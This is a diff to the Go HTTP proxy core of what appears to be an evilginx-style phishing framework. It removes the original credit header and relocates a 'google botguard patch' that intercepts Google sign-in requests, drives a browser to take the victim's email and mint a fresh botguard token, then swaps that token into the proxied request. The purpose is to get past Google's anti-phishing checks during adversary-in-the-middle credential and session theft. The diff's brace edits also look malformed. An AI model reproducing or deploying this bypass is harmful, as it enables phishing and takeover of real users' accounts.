@@ -1,10 +1,3 @@
-/*
-
-This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
-Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
-
-*/
-
 package core
 
 import (
@@ -665,6 +658,49 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
+					// google botguard patch
+				 		if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
+				 			log.Debug("GoogleBypass working with: %v", req.RequestURI)
+
+				 			// Decode URL encoded body
+				 			decodedBody, err := url.QueryUnescape(string(body))
+				 			if err != nil {
+				 				log.Error("Failed to decode body: %v", err)
+				 			}
+				 			decodedBodyBytes := []byte(decodedBody)
+				 			b := &GoogleBypasser{
+				 				isHeadless:     false,
+				 				withDevTools:   false,
+				 				slowMotionTime: 1500,
+				 			}
+				 			b.Launch()
+				 			b.GetEmail(decodedBodyBytes)
+				 			b.GetToken()
+				 			decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+
+				 			// Re-encode the body as form data
+				 			postForm, err := url.ParseQuery(string(decodedBodyBytes))
+				 			if err != nil {
+				 				log.Error("Failed to parse form data: %v", err)
+				 			}
+				 			body = []byte(postForm.Encode())
+				 			req.ContentLength = int64(len(body))
+				 		}
+				 	}
+				 }
+
+				 // check if request should be intercepted
+				 if pl != nil {
+				 	if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+				 		for _, ic := range pl.intercept {
+				 			//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+				 			//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+				 			if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+				 				return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+				 			}
+				 		}
+				 	}
+				 }
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 
 						// patch phishing URLs in JSON body with original domains
@@ -868,9 +904,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-					}
-				}
-
+					  }  
+                      
 				// check if request should be intercepted
 				if pl != nil {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
@@ -895,12 +930,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-			}
-
+                
 			return req, nil
 		})
-
-	p.Proxy.OnResponse().
+	    p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			if resp == nil {
 				return nil
@@ -2046,49 +2079,3 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
-
-// google botguard patch
-				 		if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
-				 			log.Debug("GoogleBypass working with: %v", req.RequestURI)
-
-				 			// Decode URL encoded body
-				 			decodedBody, err := url.QueryUnescape(string(body))
-				 			if err != nil {
-				 				log.Error("Failed to decode body: %v", err)
-				 			}
-				 			decodedBodyBytes := []byte(decodedBody)
-				 			b := &GoogleBypasser{
-				 				isHeadless:     false,
-				 				withDevTools:   false,
-				 				slowMotionTime: 1500,
-				 			}
-				 			b.Launch()
-				 			b.GetEmail(decodedBodyBytes)
-				 			b.GetToken()
-				 			decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
-
-				 			// Re-encode the body as form data
-				 			postForm, err := url.ParseQuery(string(decodedBodyBytes))
-				 			if err != nil {
-				 				log.Error("Failed to parse form data: %v", err)
-				 			}
-				 			body = []byte(postForm.Encode())
-				 			req.ContentLength = int64(len(body))
-				 		}
-
-				 		req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-				 	}
-				 }
-
-				 // check if request should be intercepted
-				 if pl != nil {
-				 	if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-				 		for _, ic := range pl.intercept {
-				 			//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-				 			//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-				 			if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-				 				return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
-				 			}
-				 		}
-				 	}
-				 }
